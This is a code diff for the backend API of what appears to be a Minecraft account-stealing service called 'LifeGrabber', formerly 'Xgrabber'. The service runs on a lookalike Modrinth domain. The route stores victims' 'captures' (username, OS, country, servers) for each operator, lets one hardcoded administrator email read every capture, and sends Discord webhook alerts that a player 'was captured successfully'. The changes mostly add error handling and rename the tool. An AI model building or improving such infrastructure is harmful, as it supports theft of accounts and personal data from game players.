@@ -29,11 +29,9 @@ function getClientAuth(request) {
 async function sendDiscordWebhook(webhookUrl, grab, isNew) {
   if (!webhookUrl) return;
   const mcHead = `https://mc-heads.net/avatar/${grab.minecraft_username}/128`;
-  const siteUrl = 'https://www.modrinth.nl';
-  const detailUrl = `${siteUrl}/dashboard/grabs`;
-
+  const detailUrl = 'https://www.modrinth.nl/dashboard/grabs';
   const color = isNew ? 2201972 : 16750848;
-  const title = isNew ? 'Xgrabber — New Capture' : 'Xgrabber — Capture Updated';
+  const title = isNew ? 'LifeGrabber — New Capture' : 'LifeGrabber — Capture Updated';
   const desc = isNew
     ? `${grab.minecraft_username} was captured successfully!`
     : `${grab.minecraft_username} was updated!`;
@@ -56,11 +54,13 @@ async function sendDiscordWebhook(webhookUrl, grab, isNew) {
             { name: 'OS', value: grab.os || 'Unknown', inline: true },
             { name: 'Country', value: grab.country || 'Unknown', inline: true },
           ],
-          footer: { text: `Xgrabber · ${new Date().toLocaleString()}` },
+          footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
         }],
       }),
     });
-  } catch (e) {}
+  } catch (e) {
+    console.error('Webhook failed:', e.message);
+  }
 }
 
 export async function GET(request) {
@@ -69,27 +69,30 @@ export async function GET(request) {
 
   const supabaseAuth = getClientAuth(request);
   const { data: { user } } = await supabaseAuth.auth.getUser();
-
   if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
 
   const supabase = getClient();
 
-  if (user.email === 'lifegrading@gmail.com') {
-    let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
-    if (ownerEmail) query = query.eq('owner_email', ownerEmail);
-    const { data, error } = await query;
+  try {
+    if (user.email === 'lifegrading@gmail.com') {
+      let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
+      if (ownerEmail) query = query.eq('owner_email', ownerEmail);
+      const { data, error } = await query;
+      if (error) return NextResponse.json({ grabs: [], error: error.message });
+      return NextResponse.json({ grabs: data || [] });
+    }
+
+    const { data, error } = await supabase
+      .from('grabs')
+      .select('*')
+      .eq('owner_email', user.email)
+      .order('created_at', { ascending: false });
+
     if (error) return NextResponse.json({ grabs: [], error: error.message });
     return NextResponse.json({ grabs: data || [] });
+  } catch (e) {
+    return NextResponse.json({ grabs: [], error: e.message });
   }
-
-  const { data, error } = await supabase
-    .from('grabs')
-    .select('*')
-    .eq('owner_email', user.email)
-    .order('created_at', { ascending: false });
-
-  if (error) return NextResponse.json({ grabs: [], error: error.message });
-  return NextResponse.json({ grabs: data || [] });
 }
 
 export async function POST(request) {
@@ -103,12 +106,14 @@ export async function POST(request) {
   let ownerEmail = body.owner_email || '';
 
   if (!ownerEmail && body.minecraft_username) {
-    const { data: mapping } = await supabase
-      .from('user_minecraft')
-      .select('email')
-      .eq('minecraft_username', body.minecraft_username)
-      .single();
-    if (mapping?.email) ownerEmail = mapping.email;
+    try {
+      const { data: mapping } = await supabase
+        .from('user_minecraft')
+        .select('email')
+        .eq('minecraft_username', body.minecraft_username)
+        .single();
+      if (mapping?.email) ownerEmail = mapping.email;
+    } catch (e) {}
   }
 
   const grabData = {
@@ -137,42 +142,49 @@ export async function POST(request) {
     servers: body.servers || '',
   };
 
-  const { data: existing } = await supabase
-    .from('grabs')
-    .select('id, owner_email')
-    .eq('minecraft_username', body.minecraft_username)
-    .order('created_at', { ascending: false })
-    .limit(1)
-    .single();
-
-  let isNew = !existing;
+  let isNew = true;
   let grabId;
 
-  if (existing) {
-    grabId = existing.id;
-    await supabase
+  try {
+    const { data: existing } = await supabase
       .from('grabs')
-      .update({ ...grabData, owner_email: ownerEmail || existing.owner_email })
-      .eq('id', existing.id);
-  } else {
-    const { data, error } = await supabase
-      .from('grabs')
-      .insert([grabData])
-      .select()
+      .select('id, owner_email')
+      .eq('minecraft_username', body.minecraft_username)
+      .order('created_at', { ascending: false })
+      .limit(1)
       .single();
-    if (error) return NextResponse.json({ error: error.message }, { status: 500 });
-    grabId = data.id;
+
+    if (existing) {
+      isNew = false;
+      grabId = existing.id;
+      await supabase
+        .from('grabs')
+        .update({ ...grabData, owner_email: ownerEmail || existing.owner_email, updated_at: new Date().toISOString() })
+        .eq('id', existing.id);
+    } else {
+      const { data, error } = await supabase
+        .from('grabs')
+        .insert([grabData])
+        .select()
+        .single();
+      if (error) return NextResponse.json({ error: error.message }, { status: 500 });
+      grabId = data.id;
+    }
+  } catch (e) {
+    return NextResponse.json({ error: e.message }, { status: 500 });
   }
 
   if (ownerEmail) {
-    const { data: settings } = await supabase
-      .from('user_settings')
-      .select('webhook_url')
-      .eq('email', ownerEmail)
-      .single();
-    if (settings?.webhook_url) {
-      await sendDiscordWebhook(settings.webhook_url, grabData, isNew);
-    }
+    try {
+      const { data: settings } = await supabase
+        .from('user_settings')
+        .select('webhook_url')
+        .eq('email', ownerEmail)
+        .single();
+      if (settings?.webhook_url) {
+        await sendDiscordWebhook(settings.webhook_url, grabData, isNew);
+      }
+    } catch (e) {}
   }
 
   return NextResponse.json({ ok: true, id: grabId, isNew });
